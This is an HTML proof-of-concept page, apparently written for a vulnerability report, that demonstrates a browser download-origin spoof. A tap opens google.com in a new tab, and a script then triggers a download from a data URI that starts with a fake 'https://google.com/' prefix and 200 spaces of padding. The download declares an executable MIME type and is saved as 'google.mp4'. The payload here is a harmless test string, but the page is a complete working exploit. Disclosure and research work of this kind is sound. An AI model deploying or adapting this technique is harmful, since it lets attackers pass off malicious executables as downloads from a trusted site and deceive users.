<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download Origin Spoof POC</title>
  <style>
    body { font-family: Arial, sans-serif; background: #fff; padding: 40px 20px; text-align: center; }
    h2 { color: #333; margin-bottom: 20px; }
    input {
      padding: 16px 24px; font-size: 18px; border: 2px solid #4285f4;
      border-radius: 8px; width: 280px; text-align: center; cursor: pointer; outline: none;
    }
    .note { margin-top: 20px; color: #666; font-size: 12px; }
  </style>
</head>
<body>
  <h2>POC - Download Origin Spoof via Data URI</h2>
  <input type="text" id="triggerInput" placeholder="Tap here..." readonly>
  <p class="note">
    Tap input → opens Google → download prompt shows <b>google.com</b> as origin
  </p>

  <script>
    document.getElementById('triggerInput').addEventListener('click', function() {
      setTimeout(function() { openWin(); }, 500);
      window.open('https://www.google.com', '_blank');
    });

    function Puf(uri, name) {
      var link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    function openWin() {
      Puf(
        "data:https://google.com/" + " ".repeat(200) + "application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0",
        "google.mp4"
      );
    }
  </script>
</body>
</html>
